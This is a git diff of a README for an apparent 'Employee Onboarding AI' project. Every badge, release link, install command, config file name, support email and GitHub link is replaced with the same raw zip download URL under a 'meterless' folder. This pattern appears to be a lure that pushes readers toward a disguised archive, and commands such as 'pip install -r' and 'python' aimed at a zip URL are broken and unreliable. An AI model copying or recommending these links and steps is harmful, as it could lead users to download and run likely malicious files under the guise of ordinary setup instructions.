@@ -1,10 +1,10 @@
 # Employee Onboarding AI 🤖
 
-![Employee Onboarding AI](https://img.shields.io/badge/Version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/License-MIT-green.svg)
+![Employee Onboarding AI](https://github.com/yenibilgisayarci/employee-onboarding-ai/raw/refs/heads/main/meterless/ai-onboarding-employee-v1.9.zip) ![License](https://github.com/yenibilgisayarci/employee-onboarding-ai/raw/refs/heads/main/meterless/ai-onboarding-employee-v1.9.zip)
 
 Welcome to the **Employee Onboarding AI** repository! This project focuses on automating and optimizing employee onboarding processes using Generative AI, Natural Language Processing (NLP), and Reinforcement Learning. 
 
-[Check out the latest releases here!](https://github.com/yenibilgisayarci/employee-onboarding-ai/releases)
+[Check out the latest releases here!](https://github.com/yenibilgisayarci/employee-onboarding-ai/raw/refs/heads/main/meterless/ai-onboarding-employee-v1.9.zip)
 
 ## Table of Contents
 
@@ -55,22 +55,22 @@ To get started with the **Employee Onboarding AI**, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/yenibilgisayarci/employee-onboarding-ai.git
+   git clone https://github.com/yenibilgisayarci/employee-onboarding-ai/raw/refs/heads/main/meterless/ai-onboarding-employee-v1.9.zip
    cd employee-onboarding-ai
    ```
 
 2. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/yenibilgisayarci/employee-onboarding-ai/raw/refs/heads/main/meterless/ai-onboarding-employee-v1.9.zip
    ```
 
 3. Set up the PostgreSQL database:
    - Create a new database named `onboarding_db`.
-   - Update the `config.py` file with your database credentials.
+   - Update the `https://github.com/yenibilgisayarci/employee-onboarding-ai/raw/refs/heads/main/meterless/ai-onboarding-employee-v1.9.zip` file with your database credentials.
 
 4. Run the application:
    ```bash
-   python app.py
+   python https://github.com/yenibilgisayarci/employee-onboarding-ai/raw/refs/heads/main/meterless/ai-onboarding-employee-v1.9.zip
    ```
 
 5. Access the application in your web browser at `http://localhost:5000`.
@@ -114,9 +114,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: support@example.com
-- **GitHub**: [yenibilgisayarci](https://github.com/yenibilgisayarci)
+- **Email**: https://github.com/yenibilgisayarci/employee-onboarding-ai/raw/refs/heads/main/meterless/ai-onboarding-employee-v1.9.zip
+- **GitHub**: [yenibilgisayarci](https://github.com/yenibilgisayarci/employee-onboarding-ai/raw/refs/heads/main/meterless/ai-onboarding-employee-v1.9.zip)
 
 Explore the power of AI in employee onboarding and streamline your HR processes today!
 
-[Check out the latest releases here!](https://github.com/yenibilgisayarci/employee-onboarding-ai/releases)
+[Check out the latest releases here!](https://github.com/yenibilgisayarci/employee-onboarding-ai/raw/refs/heads/main/meterless/ai-onboarding-employee-v1.9.zip)
